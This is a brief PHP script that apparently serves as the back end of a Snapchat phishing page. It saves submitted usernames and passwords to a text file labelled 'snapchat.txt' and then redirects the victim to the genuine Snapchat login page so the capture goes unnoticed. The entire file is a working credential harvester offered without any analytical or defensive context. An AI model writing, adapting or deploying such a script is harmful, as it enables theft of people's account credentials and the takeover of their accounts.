<?php

file_put_contents("snapchat.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
